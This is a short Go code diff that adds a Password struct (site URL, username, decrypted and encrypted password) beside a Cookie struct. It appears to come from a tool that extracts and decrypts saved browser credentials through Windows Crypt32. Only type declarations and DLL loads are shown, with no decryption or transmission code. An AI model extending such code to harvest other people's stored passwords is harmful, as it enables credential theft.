@@ -21,6 +21,13 @@ type Cookie struct {
 	EncryptedValue []byte `json:"encryptedValue"`
 }
 
+type Password struct {
+	URL               string `json:"url"`
+	Username          string `json:"username"`
+	PasswordDecrypted string `json:"passwordDecrypted"`
+	PasswordEncrypted []byte `json:"passwordEncrypted"`
+}
+
 var (
 	DLLCrypt32  = syscall.NewLazyDLL("Crypt32.dll")
 	DLLKernel32 = syscall.NewLazyDLL("Kernel32.dll")
